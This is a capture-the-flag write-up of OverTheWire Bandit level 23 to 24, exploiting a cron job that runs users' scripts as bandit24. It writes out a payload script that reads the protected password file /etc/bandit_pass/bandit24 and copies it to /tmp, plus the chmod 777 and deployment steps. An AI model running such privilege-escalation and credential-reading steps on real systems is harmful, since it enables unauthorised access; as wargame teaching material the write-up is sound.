# Bandit Level 23 → Level 24

## Level Goal

A program is running automatically at regular intervals from `cron`, the time-based job scheduler. Look in `/etc/cron.d/` for the configuration and see what command is being executed.

---

## Finding the Cron Job

First, I checked the cron configuration:

```bash
cat /etc/cron.d/cronjob_bandit24
```

Output:

```text
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

This confirmed that `/usr/bin/cronjob_bandit24.sh` is executed every minute by the user `bandit24`.

I then inspected the target script:

```bash
cat /usr/bin/cronjob_bandit24.sh
```

```bash
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```

---

## Understanding the Script

Breaking down the key logic of the script:

1. **Working Directory:** Changes directory to `/var/spool/bandit24/foo`.
2. **File Loop:** Iterates through all standard (`*`) and hidden (`.*`) files in that folder.
3. **Owner Check:** Uses `stat --format "%U"` to check if the file owner is `bandit23`.
4. **Execution:** If owned by `bandit23` and it is a regular file, it executes the file (`./$i`) with a 60-second timeout.
5. **Privilege:** Because `cron` executes this cleanup script as `bandit24`, any script inside the directory owned by `bandit23` will be run with **`bandit24` privileges**.
6. **Cleanup:** Immediately deletes the file using `rm -rf "./$i"`.

---

## The Exploit Strategy

Since `/etc/bandit_pass/bandit24` can only be read by `bandit24`, and the cron job runs any script in `/var/spool/bandit24/foo` using `bandit24`'s privileges, I can write a custom shell script that copies the password to an accessible location in `/tmp`.

---

## Step-by-Step Execution

### 1. Create a Working Directory

Create a temporary folder in `/tmp` to store the payload and output file:

```bash
mkdir -p /tmp/my_bandit24_work
cd /tmp/my_bandit24_work
```

### 2. Write the Shell Script Payload

Create a script named `get_pass.sh` that reads the password file and writes it to the temporary folder:

```bash
cat << 'EOF' > get_pass.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/my_bandit24_work/password
EOF
```

### 3. Grant Full Permissions

Set executable permissions on the script and world-writeable permissions on the output folder so the `bandit24` user can write to it:

```bash
chmod 777 get_pass.sh
chmod 777 /tmp/my_bandit24_work
```

### 4. Deploy the Payload

Copy the payload script into the spool directory monitored by the cron job:

```bash
cp get_pass.sh /var/spool/bandit24/foo/
```

### 5. Retrieve the Password

Wait up to 1 minute for the cron daemon to execute the script and write the flag:

```bash
cat /tmp/my_bandit24_work/password
```

This output reveals the password for Level 24.

---

## Commands Used

```bash
cat /etc/cron.d/cronjob_bandit24

cat /usr/bin/cronjob_bandit24.sh

mkdir -p /tmp/my_bandit24_work

chmod 777 get_pass.sh

chmod 777 /tmp/my_bandit24_work

cp get_pass.sh /var/spool/bandit24/foo/

cat /tmp/my_bandit24_work/password
```

---

## What I Learned

### 1. Arbitrary Code Execution (ACE)
If a high-privilege process executes untrusted scripts supplied by low-privilege users, those scripts inherit the higher privilege level.

### 2. Privilege Escalation via Cron
By leveraging a scheduled job running as `bandit24`, commands inside custom scripts are executed under `bandit24`'s user account rather than the logged-in user (`bandit23`).

### 3. OverTheWire Conventions
All level passwords are standardly stored in `/etc/bandit_pass/<username>`, protected strictly by Unix user/group file permissions.

### 4. Basic Shell Scripting
* Using `#!/bin/bash` (shebang) to define the execution environment.
* Output redirection (`>`) to write command outputs across permission boundaries.
* Using `chmod 777` to guarantee readable/writable/executable access across different system users.

---

## Key Takeaway

> **Never allow a service running with elevated permissions to execute scripts from directories where lower-privileged users have write access.**

Data pipeline flow:

```text
Create script in /tmp
        ↓
Copy to /var/spool/bandit24/foo/ (Owned by bandit23)
        ↓
Cron runs job as bandit24
        ↓
Script executes with bandit24 permissions
        ↓
cat /etc/bandit_pass/bandit24 > /tmp/my_bandit24_work/password
        ↓
Retrieve password as bandit23
```